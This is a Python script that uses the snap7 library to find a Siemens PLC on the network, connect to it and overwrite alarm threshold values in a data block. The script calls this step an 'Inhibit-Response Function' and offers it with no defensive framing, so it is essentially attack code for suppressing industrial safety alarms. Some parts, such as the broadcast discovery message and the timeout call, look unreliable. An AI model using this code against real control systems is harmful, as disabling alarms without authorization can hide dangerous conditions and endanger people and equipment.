import snap7
import socket
import struct
import time

# Configuration - Adjust these values to match your environment
PLC_IP = None  # Initially set to None, will be discovered if needed
RACK = 0       # PLC Rack number (typically 0)
SLOT = 1       # PLC Slot number (typically 1)
ALARM_BLOCK_DB_NUMBER = 10 # Example DB number - adjust based on your PLC program
ALARM_SETTINGS_OFFSET = 0 # Offset within the DB where alarm settings start
NUM_ALARMS_TO_MODIFY = 5  # Number of alarm settings to modify
NEW_ALARM_THRESHOLD = 1000 # Example new threshold value
SLEEP_DURATION = 2  #Sleep duration between the alarm settings.

# --- Helper Functions ---
def find_plc_ip():
    """
    Discovers the PLC's IP address by broadcasting a discovery message.
    """
    UDP_IP = "255.255.255.255"  # Broadcast address
    UDP_PORT = 161  # Typically used for SNMP, but often responds for PLC discovery

    # Siemens Discovery Message
    MESSAGE = b'\xfe\xdc\xba\x98\x08\x00' + b'\x00' * 4  # Siemens CP Info

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
    sock.settimeout(5)  # Timeout after 5 seconds if no response.  Adjust as needed.

    try:
        data, addr = sock.recvfrom(1024)
        sock.close()

        # Extract IP address from the response (assuming standard format)
        if data:
            # Simple parsing based on common Siemens CP response format
            ip_address = addr[0]
            print(f"PLC IP Address Found: {ip_address}")
            return ip_address
        else:
            print("No response received from the PLC discovery broadcast.")
            return None
    except socket.timeout:
        print("Timeout: No PLC response received.")
        sock.close()
        return None
    except Exception as e:
        print(f"An error occurred during PLC discovery: {e}")
        sock.close()
        return None

def connect_to_plc(ip, rack, slot):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    plc.set_timeout(timeout=5000, tcpto=5000, data_timeout=5000, tagnames_timeout=5000)
    try:
        plc.connect(ip, rack, slot)
        print(f"Successfully connected to PLC at {ip}")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC at {ip}: {e}")
        return None

def read_alarm_setting(plc, db_number, offset, alarm_index):
    """Reads a single alarm setting from the PLC's DB."""
    try:
        alarm_offset = offset + (alarm_index * 4)  # Assuming each alarm setting is 4 bytes (e.g., REAL)
        data = plc.db_read(db_number, alarm_offset, 4)
        # Convert bytes to REAL (float) - adjust based on your data type
        value = struct.unpack(">f", data)[0]  # ">f" for big-endian float
        print(f"Alarm {alarm_index}: Current Threshold = {value}")
        return value
    except Exception as e:
        print(f"Error reading alarm {alarm_index} from DB {db_number} offset {offset}: {e}")
        return None

def modify_alarm_setting(plc, db_number, offset, alarm_index, new_threshold):
    """Modifies a single alarm setting in the PLC's DB."""
    try:
        alarm_offset = offset + (alarm_index * 4)  # Assuming each alarm setting is 4 bytes (e.g., REAL)
        # Convert the new threshold to bytes (REAL format)
        data = struct.pack(">f", float(new_threshold))  # ">f" for big-endian float

        plc.db_write(db_number, alarm_offset, data)  # Write the modified value
        print(f"Alarm {alarm_index}: Threshold modified to {new_threshold}")
        return True
    except Exception as e:
        print(f"Error writing to alarm {alarm_index} in DB {db_number} offset {offset}: {e}")
        return False

def main():
    global PLC_IP # access the global variable

    # 1. Discover PLC IP (if not already configured)
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address not found. Exiting.")
            return

    # 2. Connect to PLC
    plc = connect_to_plc(PLC_IP, RACK, SLOT)
    if plc is None:
        print("Failed to connect to the PLC. Exiting.")
        return

    # 3. Inhibit-Response Function: Modify Alarm Settings
    print("\nModifying Alarm Settings:")
    for i in range(NUM_ALARMS_TO_MODIFY):
        read_alarm_setting(plc, ALARM_BLOCK_DB_NUMBER, ALARM_SETTINGS_OFFSET, i)
        modify_alarm_setting(plc, ALARM_BLOCK_DB_NUMBER, ALARM_SETTINGS_OFFSET, i, NEW_ALARM_THRESHOLD)
        time.sleep(SLEEP_DURATION)

    # 4. Disconnect from PLC (Important!)
    plc.disconnect()
    print("Disconnected from PLC.")


if __name__ == "__main__":
    main()